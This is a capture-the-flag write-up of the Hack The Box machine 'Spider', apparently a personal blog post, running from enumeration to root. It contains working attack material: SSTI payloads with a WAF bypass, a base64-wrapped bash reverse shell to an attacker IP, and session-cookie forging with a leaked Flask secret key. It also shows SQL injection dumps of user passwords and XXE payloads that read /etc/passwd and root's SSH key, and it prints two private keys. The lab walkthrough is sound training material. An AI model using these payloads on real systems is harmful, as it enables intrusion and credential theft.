
   ![[Pasted image 20211028192537.png]]
# [SPIDER- BOX]            

  Hi folks, today I am going to solve a hard rated hack the box machine,spider created by InfosecJack and Chivato.So without any further intro, let's jump in.
# common enumeration

## Nmap
 *TCP over SSH
  *HTTP Default page
  *Host 7.6p1 Ubuntu 4ubuntu0.3
  
#### code-Nmap
```bash
nmap -sC -sV  -A -oN nmap.txt  10.10.10.243 
```

#### output
 
  ![[spider/static png/nmap.png]] 

 
 ```bash
 # Nmap 7.91 scan initiated Thu Oct 21 10:15:08 2021 as: nmap -sC -sV -A -oN nmap.txt 10.10.10.243
Nmap scan report for 10.10.10.243
Host is up (0.72s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

## Default Page-AMAD
lets check the default page  but first we need to add the hostname to ``/etc/hosts ``file and browse the page.
#### code-/etc/hosts
```bash
echo 10.10.10.243 spider.htb > /etc/hosts
```

http://spider.htb

While i was checking at the templetes , I found a username 	``chiv``

![[chiv.png]]

Then i decided to look for  directories which are avaliable  in the site by doing ``gobuster``  to enumerate the directories

#### code -gobuster
```bash
gobuster dir -u  http://spider.htb  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobusters
```

#### Output
![[gob.png]]

```bash
===============================================================
2021/10/21 10:53:23 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1832]
/index                (Status: 200) [Size: 11273]
/register             (Status: 200) [Size: 2130] 
/user                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/logout               (Status: 302) [Size: 209] [--> http://spider.htb/]     
/cart                 (Status: 500) [Size: 290]                              
/checkout             (Status: 500) [Size: 290]                              
/view                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/main                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/product-details      (Status: 308) [Size: 275] [--> http://spider.htb/product-details/]
                                                                                        
===============================================================
2021/10/21 11:39:02 Finished
===============================================================
```

First i register myself with random crecidentials:- http://spider.htb/register
 #### Registration-panel
![[]]

After submitting this page the default login page appears with some weird thing-to which it specifies username us a ``uuid`` which is the uuid of the user
#### admin-login
![[adm.png]]

#### user as-les
Then after entering the password, i am in!

![[logedin.png]]

In the left side there is a button ``user information`` .Click that,

![[userinfo.png]]

This shows my ``username`` and corresponding ``uuid``.My ``username`` is reflected here but i can not change the ``username`` at all .At this point,i am going to check for ``SSTI`` (Server Side Template Injection).
[Server Side Template Injection- is a vunerability where the attacker injects malicious inputs into the template to execute commands on the server-side.This vunerability occurs when invalid user inputs is embeded into the template engine which can generally lead to remote code execution (RCE)]

To do that lets register a new account with username as {{8*5}} and after logging in, we visit the ``user information``to confirm that our payload has worked ;we see this:

#### user as-{{8*5}}
![[40 .png]]

YES! it shows the result of the multiplication operation as ``8*5=40``.So time to try some real injection.Maximum ``username ``length is restricted to 10 characters, which limits what we can do with the ``SSTI vulnerability``.

![[user10.png]]

What cames in mind is to try geting the configuration file using this payload 	``{{config}}``so that i can retrive the configation object of the application to which i will register a new username with ``{{config}}``

#### user as-{{config}}
![[registration.png]]

Registering anmaccount with this ``username`` results in the following being displayed on the ``user information``

#### config-retrived
![[conn.png]]

Retrived configuration  in the username field

```bash
<Config {'ENV': 'production', 
'DEBUG': False,
'TESTING': False,
'PROPAGATE_EXCEPTIONS': None,
'PRESERVE_CONTEXT_ON_EXCEPTION': None,
'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
'USE_X_SENDFILE': False,
'SERVER_NAME': None, 
'APPLICATION_ROOT': '/',
'SESSION_COOKIE_NAME': 'session',
'SESSION_COOKIE_DOMAIN': False,
'SESSION_COOKIE_PATH': None,
'SESSION_COOKIE_HTTPONLY': True,
'SESSION_COOKIE_SECURE': False,
'SESSION_COOKIE_SAMESITE': None,
'SESSION_REFRESH_EACH_REQUEST': True,
'MAX_CONTENT_LENGTH': None,
'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200),
'TRAP_BAD_REQUEST_ERRORS': None,
'TRAP_HTTP_EXCEPTIONS': False,
'EXPLAIN_TEMPLATE_LOADING': False,
'PREFERRED_URL_SCHEME': 'http',
'JSON_AS_ASCII': True,
'JSON_SORT_KEYS': True,
'JSONIFY_PRETTYPRINT_REGULAR': False,
'JSONIFY_MIMETYPE': 'application/json',
'TEMPLATES_AUTO_RELOAD': None,
'MAX_COOKIE_SIZE': 4093,
'RATELIMIT_ENABLED': True,
'RATELIMIT_DEFAULTS_PER_METHOD': False,
'RATELIMIT_SWALLOW_ERRORS': False,
'RATELIMIT_HEADERS_ENABLED': False,
'RATELIMIT_STORAGE_URL': 'memory://',
'RATELIMIT_STRATEGY': 'fixed-window',
'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset',
'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining',
'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit',
'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After',
'UPLOAD_FOLDER': 'static/uploads'
}>
```

I recogonise a ``Secret key``which can be used to sign session cookies. We read
our current cookie from our browser developer tools and use the `` base64`` command to decode the first field:
#### code-decode
```bash
echo -n eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjhiMWNmM2NkLTE3YjYtNDU1ZC1iMjY5LTUwYzdlZTZhZWIxMyJ9 | base64 -d 
```

![[cart.png]]

The session data object contains two fields, namely ``cart_items`` and ``uuid`` . When opening the page as a logged in user, we see that the username is displayed within a "logged in" message. 

![[config.png]]

This does  not appear to be vulnerable to SSTI, but we can attempt other types of injection; for example, assuming the ``username ``is retrieved from a ``database``by querying the ``uuid parameter`` in our session cookie, we can test for ``SQL injection``.
We add a simple ``SQL injection payload`` to our ``uuid ``and use the ``flask-unsign ``tool to sign a valid session cookie by providing the ``secret key`` recovered earlier:We first install flask_unsign:
#### code-flask_unsign
```bash
pip3 install flask_unsign
```

#### code-sign a valid cookie
```bash
flask-unsign --sign --cookie "{\"cart_items\":[],\"uuid\":\"71f57eec-d494-455a-9c8f-3398c67ed5c7' or 1=1 -- -\"}" --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```

![[1-11.png]]

After replacing our current ``session cookie`` with the one we just generated, we notice the username has changed:

![[cookie.png]]

This means we got confirmation that the ``uuid parameter`` is injectable,In order to be able to forge a ``valid session cookie`` for this user we would need the associated ``uuid ``, which we might be able to retrieve from the ``database ``through the same ``SQL injection vulnerability`` which depends on ``UNION-BASED ``payload. or [ we write a simple proxy application that will get requests from sqlmap , forge and sign the corresponding cookies and relay requests to the remote server, returning the output to sqlmap for processing].

## Database Dumping Using sqlmap

### Method 1: ``UNION-BASED``
To dump the database i have to call the ``--eval`` parameter in the ``sqlmap`` to manipulate the requests before sending them then fees the ``secret key`` against the sqlmap
#### code-eval call
```bash
sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --dump
```

![[sql.png]]

sqlmap prompt requires merge of the cookies do not merge the cookies because we have provided our cookie with ``*`` so that it can dump all the database session

#### Response:
The contents of ``users ``table in the ``shop database ``are returned:

![[dumpsql.png]]

```bash
Database: shop
Table: users
[3 entries]
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | 9d61933d-5c24-4081-9b46-cdfea24f327d | {{8*5}}    | les98           |
| 3  | 71f57eec-d494-455a-9c8f-3398c67ed5c7 | {{config}} | tULI98          |
+----+--------------------------------------+------------+-----------------+
```

And this leaks the ``uuid`` and password of our user `chiv`

``intial Recon:``
we can login in with credentials:
![[]]

### Method 2:Proxy application middleware
We write a python script that will get request from the `sqlmap` forge and sign the cookies and relay it to the remote sever then returning the sqlmap to the server for processing.
#### code-python payload
```bash
#!/usr/bin/python3
from flask import *import requests
from flask.sessions import SecureCookieSessionInterface
import uuid

app = Flask(__name__)

app.secret_key = "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route("/")
def index():
		uuid = request.args['uuid']
		data = {"uuid": uuid, "cart_items": []}
		cookie = session_serializer.dumps(data)
		cookies = {"session": cookie}
		r = requests.get("http://spider.htb/", cookies=cookies)
		return r.text

if __name__ == "__main__":
app.run()
```

After running the above Flask application, we run `sqlmap `with the ``--dump`` option as follows, setting the injection on the  ``uuid parameter:``
#### code-sqlmap
```bash
sqlmap -u "http://127.0.0.1:80?uuid=71f57eec-d494-455a-9c8f-3398c67ed5c7" -p uuid --
dump
```

The contents of `users table `in the `shop database `are returned:

```bash
Database: shop
Table: users
[3 entries]
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | 9d61933d-5c24-4081-9b46-cdfea24f327d | {{8*5}}    | les98           |
| 3  | 71f57eec-d494-455a-9c8f-3398c67ed5c7 | {{config}} | tULI98          |
+----+--------------------------------------+------------+-----------------+
```

## Intial FootHold
Let's Login with the credentials or forge a valid cookie for ``user`` ``chiv`` to forge we use flask_usign and chiv ``uuid`` to crete a valid session:
#### code-cookie forge
```bash
flask-unsign --sign --cookie '{"cart_items":[],"uuid":"129f60ea-30cf-4065-afb9-
6be45ad38b73"}' --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
```

![[forge.png]]

After  using the credentials from the sqlmap or replacing our session cookie and reloading the page, we are successfully logged in as ``chiv ``. We can now access the admin panel:

![[adminpn.png]]

When clicking the messages button, the user's message board is displayed which has a fix on the support ticket 

![[messages support.png]]

## Enumeration and Injecting
The http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal page contains a form for submitting  ``support tickets:``

![[ticket.png]]

From this page we can post ``support tickets`` which will be displayed on the ``view support page.`` As was the case with the ``username`` earlier,since it was vunerable to ``SSTI`` . I attempted to send a simple ``SSTI test payload such as {{8*5}} ``results in the following error:

![[erro.png]]

This suggests a ```Web Application Firewall(WAF) ```is in place and is responsible for blocking common ``SSTI payloads``.

Then i decide to do a Wfuzz on  http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal to discover other bad characters using the special char worldlist.

#### code-Wfuzz
```bash
wfuzz -H 'Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjEyOWY2MGVhLTMwY2YtNDA2NS1hZmI5LTZiZTQ1YWQzOGI3MyJ9.YXiI_g.CZ31SdpoeuG_rGPf3ZWmzoxHPHc' -u spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal -d 'contact=FUZZ&message=Night'  -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -t 1 -s .5
```

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal
Total requests: 32

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                  
=====================================================================

000000001:   200        66 L     128 W      1565 Ch     "~"                                                                                                      
000000002:   200        66 L     128 W      1565 Ch     "!"                                                                                                      
000000003:   200        66 L     128 W      1565 Ch     "@"                                                                                                      
000000004:   200        66 L     128 W      1565 Ch     "#"                                                                                                      
000000005:   200        66 L     128 W      1565 Ch     "$"                                                                                                      
000000006:   200        66 L     128 W      1565 Ch     "%"                                                                                                      
000000007:   200        66 L     128 W      1565 Ch     "^"                                                                                                      
000000008:   200        66 L     129 W      1574 Ch     "&"                                                                                                      
000000009:   200        66 L     128 W      1565 Ch     "*"                                                                                                      
000000010:   200        66 L     128 W      1565 Ch     "("                                                                                                      
000000011:   200        66 L     128 W      1565 Ch     ")"                                                                                                      
000000012:   200        66 L     128 W      1565 Ch     "-"                                                                                                      
000000013:   200        66 L     139 W      1607 Ch     "_"                                                                                                      
000000014:   200        66 L     128 W      1565 Ch     "+"                                                                                                      
000000015:   200        66 L     128 W      1565 Ch     "="                                                                                                      
000000016:   200        66 L     128 W      1565 Ch     "{"                                                                                                      
000000017:   200        66 L     128 W      1565 Ch     "}"                                                                                                      
000000018:   200        66 L     128 W      1565 Ch     "]"                                                                                                      
000000019:   200        66 L     128 W      1565 Ch     "["                                                                                                      
000000020:   200        66 L     128 W      1565 Ch     "|"                                                                                                      
000000021:   200        66 L     128 W      1565 Ch     "\"                                                                                                      
000000022:   200        66 L     128 W      1565 Ch     "`"                                                                                                      
000000023:   200        66 L     128 W      1565 Ch     ","                                                                                                      
000000024:   200        66 L     139 W      1607 Ch     "."                                                                                                      
000000025:   200        66 L     128 W      1565 Ch     "/"                                                                                                      
000000026:   200        66 L     128 W      1565 Ch     "?"                                                                                                      
000000027:   200        66 L     128 W      1565 Ch     ";"                                                                                                      
000000028:   200        66 L     128 W      1565 Ch     ":"                                                                                                      
000000029:   200        66 L     139 W      1607 Ch     "'"                                                                                                      
000000030:   200        66 L     128 W      1565 Ch     """                                                                                                      
000000031:   200        66 L     128 W      1565 Ch     "<"                                                                                                      
000000032:   200        66 L     128 W      1565 Ch     ">"   
```

As we can see the ``1607 ch``  shows other commonly used characters like  ``_ , ' ' `` which are blocked, which results in more explicit error messages:

![[waf.png]]

### Payload - Research,Error ,Trial and Defination
After doing some research i came up with a payload:
#### code-unrefined payload
```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

But the payload seem to have bad characters in it like the ``'`` and ``{{}}`` so i had to replace the ``'`` with the ``"`` and the ``{{}}`` with the single ``{}`` then add keyword ``include ``to which it is not blocked.The  ``_``char  is written in the hex us ``\x5f`` to which ``man ascii`` confirms even in python3 when you print the hex  ``\x5f`` it gives you
 ``_`` 
 
 ![[man ascii.png]]
 
 ![[python x5f.png]]
 
 #### code-working payload check
 note:insert payload in the ``contact= ``
 ```bash
 {% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("sleep 5")|attr("read")()%}
 ```
 
 So after getting the payload i decide to test the payload by forcing it to ``sleep fo 5 miliseconds ``so as to test if the payload works and apparently the payload works which confirms`` blind Remote Code Execution(RCE) via Server Side Template Injection(SSTI)``.
 
 ![[sleep 5.png]]
 
 Since our payload looks fine so we have to adjust our payload to obtain a r``reverse shell``  using ``base64`` encoding to bypass WAF filters;
 #### code-encoding reverse shell to base64
 ```bash
 echo 'bash -i >& /dev/tcp/10.10.16.51/9001 0>&1' | base64 -w 0 
 ```
 
 ![[echo.png]]
 
 The final payload looks us following;
 #### code-final payload
 ```bash
 {% include request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41MS85MDAxIDA+JjEK | base64 -d | bash")|attr("read")()%}
 ```
 
 Then we paste our complete payload in contact .in burpsuite we have to url encode the ``reverse shell payload`` to filter out bad characters in the payload 
 
 ![[payl.png]]
 
 Then we open an nc listener  on port 9001
 
#### code-Listening
 ```bash
 nc -lnvp 9001
 ```
 
 After posting a support ticket with the above ``SSTI payload `` to the contact a ``reverse shell ``is sent back to our listener which was Listening on port 9001
 
 ![[shell.png]]

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo
 fg [Enter] two times
 ```
 
 Then setting the TERM so that you are able to clean the terminal:
 ```bash
 export TERM=xterm
 ```
  
  Having the shell as a regular user ``chiv``  we can find the ``user.txt`` on the ``home`` directory but we can also find a ``.ssh directory`` 
  
 ![[usertxt.png]]]
 
 .ssh directory we can use the id_rsa to gain a rsa key which we can use it in gaining a fully interactive  ssh shell
 
 ![[rsa.png]]
 ```bash
 -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----
```

 
 we copy the key then we have to execute ``chmod`` on the key to make it detected:
#### code-chmod on key
 ```bash
 chmod 600 chiv.key
 ```
 
 Then we use the ``chiv key`` to have an interactive shell after ssh alongside chiv
#### code-ssh@chiv
 ```bash
 ssh -i chiv.key chiv@spider.htb
 ```
 
 ![[sshlog.png]]
 
## Privilege Escalation
The output of the ``ps aux`` command shows a ``uwsgi `` process running as ``root ``  Looking at``listening ports``, we discover a local webserver on ``port 8080``:

#### code- listenig port
 ```bash
 ss -lntp
 ```
 
 ![[forwadingport.png]]
 
 Then we forward our ``local port 8000 ``to ``port 8080 ``on the remote target using ``ssh``  by typing this which will give you the ssh inside ``chiv``
#### code- get ssh to forward the webserver
 ```bash
 ~ shift C
 ```
 
#### code-forwarding port
 ```bash
 -L 8000:127.0.0.1:8080
 ```

## Default Page- BETA
 We can now access the  ``web server`` by browsing to http://localhost/8000. A login form is shown:
 
 ![[betalog.png]]
 
 Any ``username ``works here, as ``no password ``is required. We are redirected to a ``shopping cart ``page:
 
 ![[betaweb.png]]
 
 This seems to be an early beta  or a js template since the ``continue Shopping ``and ``checkout functionalities ``are not implemented. Clicking the ``Logout ``button takes us back to the ``login ``form. After viewing the page source and inspecting the form contains a ``hidden input ``called ``version ``, which defaults to the ``value 1.0.0 ``.
 
 ```bash
 <input type="hidden" id="version" name="version" value="1.0.0">
 ```
 
 ![[burpbetainter.png]]
 
 We perform a new  ``login ``and retrieve our ``session cookie`` so that we can use ``flask_unsign ``to decode the cookie
#### code-flask --decode cookie
 ```bash
 flask-unsign --decode --cookie'.eJxFjUFvgyAYhv_KwnkHtPEwj51gQwMGkQ_lpqMJVrCmNWm7pv99W7Jl5_d5nveBwi0GlD_Qy4BypImgjtwaOTGozTpDTMzB8Puws2OvWQUF7VVgIPSieOlBaX51dDsPn_44NCG1RGKFQyGNY_XOnw141f_sqWMS01lpsbU4kENBjzzYrItJ6eiiBYCB1u814Rn__oM5jIO22IT_3p9flbRrorWQMNzBB97jhLiN9YZk0YBTrqSteF-LXv_y5HrX0U811meZLhsXxVq1dqoL-Yaer2g5jfN6QTl-fgGY41gu.YXnpXA.cKSG93T7Qs89GMbkBx5DLKeEgn4'
 ```
 
 The session object contains a  ``base64-encoded lxml field``:
 ```bash
 {'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGVzbGV5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=', 'points': 0}
 ```
 
 ![[decodecookie.png]]
 
 We then decode the ``lxml``  
#### code decoding lxml
 ```bash
 echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGVzbGV5PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d
 ```
 And after  decoding the ``lxml`` we obtain a XML code
 ```bash
 <!-- API Version 1.0.0 -->
<root>
    <data>
        <username>lesley</username>
        <is_admin>0</is_admin>
    </data>
</root>   
 ```
 
 The  ``API Version ( 1.0.0 )`` matches the value sent from the l``ogin form`` .In fact, if we intercept a ``login request`` with ``Burp Proxy ``and change the`` version value ``to an arbitrary string of our choosing, the same string is reflected back in the ``generated XML code ``that is added to our session cookie:
 
 ![[movie.png]]
 
 ```bash
 <!-- API Version MOVIENIGHT -->
<root>
    <data>
        <username>lesley</username>
        <is_admin>0</is_admin>
    </data>
</root>   
 ```
 
  
### Privilege escalation payload-Research,Trial and Defination
 This may allow us to perform`` XXE injection ``by appending a DTD element after the initial comment. 
#### code-payload test
 ```bash
 <!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///etc/passwd'>]><!--
 ````
 
 We then run ``Burpsuite ``the add this payload to the intial comment  i.e``version=1.0.0--><!DOCTYPE root...``.In order to trigger ``XXE`` and load the external entity file, we also have to set the ``username ``to ``& [and the user you logged in with] `` and url-encode the ``username``
 
 ![[etcpay.png]]
 
  We then ``send ``the ``request`` and we ``copy ``the set-cookie  session from the ``response ``then we ``follow-redirect`` then we paste the cookie to cookie session in the ``request that was redirected to``.we then send the ``request`` and we get the ``etc/passswd`` in the ``response``
 
 ![[etcpass.png]]
 
Since we believe the application is running with root privileges, we can get the ``root .txt ``by changing our payload  to this ``/root/root.txt`` file as our external entity. Our payload looks as follows:
#### code -payload-root.txt
```bash 
<!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///root/root.txt'>]><!--
```

![[redirectroot.png]]

we then repeat this process . We then ``send ``the ``request`` and we ``copy ``the set-cookie  session from the ``response ``then we ``follow-redirect`` then we paste the cookie to cookie session in the ``request that was redirected to``.we then send the ``request`` and we get the ``root.txt`` in the ``response``]

we get the root.txt from the response;

![[roottxt.png]]

Lets get the ``rsa key`` so that we can ssh the root .we set the /root/.ssh/id_rsa file as our external entity. Our payload looks as follows:
#### code-payload-.ssh
```bash
<!DOCTYPE root [<!ENTITY admin SYSTEM 'file:///root/.ssh/id_rsa'>]><!--
```

![[sshroot.png]]

we then repeat this process . We then ``send ``the ``request`` and we ``copy ``the set-cookie  session from the ``response ``then we ``follow-redirect`` then we paste the cookie to cookie session in the ``request that was redirected to``.we then send the ``request`` and we get the ``id_rsa key`` in the ``response``]

![[rootssh.png]]
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb
sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN
rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e
HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M
s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt
WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy
R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0
kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS
FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS
BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl
w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui
/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ
mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3
AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg
LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT
Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j
64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK
teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8
vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
-----END RSA PRIVATE KEY-----
```



After copying the key to our machine we can use it to ssh to the system as root :
#### code-chmod on root key
 ```bash
 chmod 600 root.key
 ```
 
 Then we use the ``root key`` to have an interactive shell after ssh alongside root

#### code-ssh@chiv
 ```bash
 ssh -i root.key root@spider.htb
 ```
 
 ![[fanally.png]]

Successfully obtained the flag file with root privileges
 
    -------------------------END successful attack @leshack98----------------------
 
